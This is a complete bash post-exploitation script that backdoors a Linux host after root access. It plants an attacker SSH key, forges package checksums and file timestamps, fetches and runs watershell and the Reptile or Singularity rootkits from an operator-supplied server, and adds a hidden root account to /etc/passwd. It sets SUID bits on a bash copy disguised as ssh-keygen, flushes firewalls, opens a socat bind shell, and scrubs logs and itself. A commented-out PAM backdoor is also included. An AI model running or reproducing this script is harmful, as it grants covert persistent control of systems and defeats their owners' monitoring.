#!/bin/bash

set +e
set +o history
unset HISTFILE

CWD=$(pwd)

# Validate input
if [ $# -ne 1 ]; then
    echo "Usage: $0 <server_ip:port>"
    exit 1
fi
SERV_IP_PORT="$1"

# Check for wget or curl
FETCH_CMD="wget"
if ! command -v wget &>/dev/null; then
    FETCH_CMD="curl -O"
fi

SYSTEM=""

export NAME="dhcpcnf"

# Create directories
mkdir -p /etc/${NAME}
mkdir -p /dev/shm/${NAME}
cd /dev/shm/${NAME}

# Setup SSH backdoor and cron persistence
if ! grep -Fq "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/.ssh/authorized_keys" /etc/ssh/sshd_config; then
  sed -i 's/^.*AuthorizedKeysFile.*$/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/.ssh\/authorized_keys/g' /etc/ssh/sshd_config
  touch -a -m -t `find /etc/ssh/ssh_config -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/ssh/sshd_config
  mkdir -p /etc/ssh/.ssh
  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAWDlKPWaryrDFdaO95fsZckeAle/JgxfI7QDwCxsMBF root@localhost" > /etc/ssh/.ssh/authorized_keys
  touch -a -m -t `find /etc/ssh/ssh_config -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/ssh/.ssh/authorized_keys
  find /var/lib/dpkg/info -type f -name "*ssh*.md5sums" -exec sed -i "s/^.*etc\/ssh\/sshd_config/$(md5sum etc/ssh/sshd_config | sed 's/\//\\\//g')/g" "{}" \; -exec touch -a -m -t $(find /var/lib/dpkg/info/linux-base.md5sums -maxdepth 1 -printf '%TY%Tm%Td%TH%TM') "{}" \;
  systemctl enable ssh
  systemctl restart ssh
  systemctl enable sshd
  systemctl restart sshd
  rc-service sshd restart
fi

# Determine package manager
PKG_MANAGER=""
if command -v apt &>/dev/null; then
    PKG_MANAGER="apt install -y"
    SYSTEM="debian"
    apt update -y
    $PKG_MANAGER gcc make socat build-essential linux-headers-$(uname -r)
elif command -v dnf &>/dev/null; then
    PKG_MANAGER="dnf install -y"
    SYSTEM="rhel"
    # dnf update -y
    $PKG_MANAGER gcc make socat kernel-devel-$(uname -r) elfutils-libelf-devel
elif command -v yum &>/dev/null; then
    PKG_MANAGER="yum install -y"
    SYSTEM="rhel"
    # yum update -y
    $PKG_MANAGER gcc make socat kernel-devel-$(uname -r) elfutils-libelf-devel
else
    exit 1
fi

# Backdoor PAM
# $FETCH_CMD $SERV_IP_PORT/pam_backdoor.c

# gcc -fPIC -shared -o pam_${NAME}.so pam_backdoor.c

# # Modify PAM configuration
# if [ "$SYSTEM" = "debian" ]; then
#     $PKG_MANAGER libpam0g-dev
#     PAM_SO_FILE=""
#     PAM_VAR="pam_${NAME}.so"
#     # Find module location
#     if [ -d /lib/x86_64-linux-gnu/security ]; then
#         PAM_SO_FILE="/lib/x86_64-linux-gnu/security/pam_${NAME}.so"
#     elif [ -d /lib/security ]; then
#         PAM_SO_FILE="/lib/security/pam_${NAME}.so"
#     elif [ -d /lib/i386-linux-gnu/security ]; then
#         PAM_SO_FILE="/lib/i386-linux-gnu/security/pam_${NAME}.so"
#     elif [ -d /usr/lib64/security ]; then
#         PAM_SO_FILE="/usr/lib64/security/pam_${NAME}.so"
#     elif [ -d /usr/lib/security ]; then
#         PAM_SO_FILE="/usr/lib/security/pam_${NAME}.so"
#     else
#         PAM_SO_FILE="/etc/pam.d/pam_${NAME}.so"
#         PAM_VAR="/etc/pam.d/pam_${NAME}.so"
#     fi
#     mv pam_${NAME}.so "$PAM_SO_FILE"
#     chmod -x "$PAM_SO_FILE"
#     if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/common-auth"; then
#         awk -v newline="auth    sufficient                      $PAM_VAR" '
#             NF > 0 && $1 !~ /^#/ && !done {
#                 print newline;
#                 $0 = $0 " use_first_pass";
#                 done = 1;
#             }
#             { print }
#         ' "/etc/pam.d/common-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/common-auth"
#     fi
#     touch -d "Jun 26 2022" "/etc/pam.d/common-auth"
# else
#     $PKG_MANAGER pam-devel 
#     PAM_SO_FILE=""
#     PAM_VAR="pam_${NAME}.so"
#     # Find module location
#     if [ -d /lib64/security ]; then
#         PAM_SO_FILE="/lib64/security/pam_${NAME}.so"
#     elif [ -d /lib/security ]; then
#         PAM_SO_FILE="/lib/security/pam_${NAME}.so"
#     elif [ -d /usr/lib64/security ]; then
#         PAM_SO_FILE="/usr/lib64/security/pam_${NAME}.so"
#     elif [ -d /usr/lib/security ]; then
#         PAM_SO_FILE="/usr/lib/security/pam_${NAME}.so"
#     else
#         PAM_SO_FILE="/etc/security/pam_${NAME}.so"
#         PAM_VAR="/etc/pam.d/pam_${NAME}.so"
#     fi
#     mv pam_${NAME}.so "$PAM_SO_FILE"
#     chmod -x "$PAM_SO_FILE"
#     if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/system-auth"; then
#         awk -v newline="auth        sufficient                                   $PAM_VAR" '
#             NF > 0 && $1 !~ /^#/ && !done {
#                 print newline;
#                 $0 = $0 " use_first_pass";
#                 done = 1;
#             }
#             { print }
#         ' "/etc/pam.d/system-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/system-auth"
#     fi
#     if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/password-auth"; then
#         awk -v newline="auth        sufficient                                   $PAM_VAR" '
#             NF > 0 && $1 !~ /^#/ && !done {
#                 print newline;
#                 $0 = $0 " use_first_pass";
#                 done = 1;
#             }
#             { print }
#         ' "/etc/pam.d/password-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/password-auth"
#     fi  
#     touch -d "Jun 26 2022" "/etc/pam.d/system-auth"
#     touch -d "Jun 26 2022" "/etc/pam.d/password-auth"
# fi  


# Enable root login - not necessary if using a key
# if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
#     sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
# else
#     echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
# fi
# systemctl restart sshd 2>/dev/null &
# systemctl restart ssh 2>/dev/null &


# Install Watershell
$FETCH_CMD "$SERV_IP_PORT/watershell.tar.gz"
tar -xvf watershell.tar.gz
rm watershell.tar.gz
cd watershell
gcc -o ${NAME}_sys watershell.c || mv ${NAME}_sys /etc/${NAME}/
mv ${NAME}_sys /etc/${NAME}/
/etc/${NAME}/${NAME}_sys &
cat > /etc/systemd/system/${NAME}_sys.service <<EOF
[Unit]
Description=${NAME^} Authentication System Service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/etc/${NAME}/${NAME}_sys &
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
cd /dev/shm/${NAME}
systemctl enable ${NAME}_sys.service

# Set SUID bits
chmod u+s $(which ip) $(which chroot)
if [ "$SYSTEM" = "rhel" ]; then
    mkdir -p /usr/lib/openssh
fi
cp $(which bash) /usr/lib/openssh/ssh-keygen
chmod u+s /usr/lib/openssh/ssh-keygen

# Set up triggerable
cat > /etc/${NAME}/trigger.sh << EOF
#!/bin/bash
set -euo pipefail

# Firewall
if command -v firewall-cmd >/dev/null 2>&1; then
    systemctl stop firewalld || true
    systemctl disable firewalld || true
fi

if command -v ufw >/dev/null 2>&1; then
    ufw --force disable || true
fi

if command -v nft >/dev/null 2>&1; then
    nft flush ruleset || true
fi

if command -v iptables >/dev/null 2>&1; then
    for table in filter nat mangle raw security; do
        iptables -t "$table" -F || true
        iptables -t "$table" -X || true
    done

    iptables -P INPUT ACCEPT || true
    iptables -P FORWARD ACCEPT || true
    iptables -P OUTPUT ACCEPT || true
fi

if command -v ip6tables >/dev/null 2>&1; then
    for table in filter nat mangle raw security; do
        ip6tables -t "$table" -F || true
        ip6tables -t "$table" -X || true
    done
    ip6tables -P INPUT ACCEPT || true
    ip6tables -P FORWARD ACCEPT || true
    ip6tables -P OUTPUT ACCEPT || true
fi

# SSH key
if ! grep -Fq "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/.ssh/authorized_keys" /etc/ssh/sshd_config; then
  sed -i 's/^.*AuthorizedKeysFile.*$/AuthorizedKeysFile .ssh\/authorized_keys \/etc\/ssh\/.ssh\/authorized_keys/g' /etc/ssh/sshd_config
  touch -a -m -t `find /etc/ssh/ssh_config -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/ssh/sshd_config
  mkdir -p /etc/ssh/.ssh
  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAWDlKPWaryrDFdaO95fsZckeAle/JgxfI7QDwCxsMBF root@localhost" > /etc/ssh/.ssh/authorized_keys
  touch -a -m -t `find /etc/ssh/ssh_config -maxdepth 1 -printf '%TY%Tm%Td%TH%TM'` /etc/ssh/.ssh/authorized_keys
  find /var/lib/dpkg/info -type f -name "*ssh*.md5sums" -exec sed -i "s/^.*etc\/ssh\/sshd_config/$(md5sum etc/ssh/sshd_config | sed 's/\//\\\//g')/g" "{}" \; -exec touch -a -m -t $(find /var/lib/dpkg/info/linux-base.md5sums -maxdepth 1 -printf '%TY%Tm%Td%TH%TM') "{}" \;
  systemctl enable ssh
  systemctl restart ssh
  systemctl enable sshd
  systemctl restart sshd
  rc-service sshd restart
fi

# Bind shell
socat TCP-LISTEN:58348,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
EOF

chmod +x /etc/${NAME}/trigger.sh

bash /etc/${NAME}/trigger.sh

# Determine kernel version
KERNEL_MAJOR=$(uname -r | cut -d'.' -f1)

# Install rootkit
if [ "$KERNEL_MAJOR" -le 4 ]; then
    $FETCH_CMD $SERV_IP_PORT/reptile.tar.gz
    tar -xvf reptile.tar.gz
    rm reptile.tar.gz
    cd reptile
    make defconfig
    make
    make install
    rm -rf ../reptile
    cd /dev/shm/${NAME}
    echo '#<reptile>' >> /etc/passwd
    echo 'tty0:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
    echo '#</reptile>' >> /etc/passwd
    touch -d "Aug 2 2018" "/etc/passwd"
    cat > /etc/systemd/system/${NAME}_stat.service <<EOF
[Unit]
Description=${NAME^} Authentication Status Service
After=network.target

[Service]
Type=oneshot
ExecStart=/lib/udev/${NAME}
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
    systemctl enable ${NAME}_stat.service
else
    sysctl kernel.ftrace_enabled=1
    $FETCH_CMD $SERV_IP_PORT/singularity.tar.gz
    tar -xvf singularity.tar.gz
    rm singularity.tar.gz
    cd singularity
    chmod +x ./load_and_persistence.sh
    ./load_and_persistence.sh
    chmod +x ./scripts/journal.sh
    ./scripts/journal.sh
fi

# clear da logs
dmesg -C

# Change file dates
touch -d "May 10 2019" "/etc/ssh/sshd_config"
touch -d "Jun 14 2018" "/etc/pam.d"
touch -d "Aug 2 2018" "/etc"
touch -d "Dec 11 2019" "/usr/lib/openssh/ssh-keygen"
touch -d "Dec 21 2019" "$(which ip)"
touch -d "Dec 29 2019" "$(which chroot)"

# Clear history
history -c
rm -f $HISTFILE
grep -rlZ "${NAME}" /var/log | xargs -0 sed -i '/${NAME}/d'

cd "$CWD"
rm -f "$0"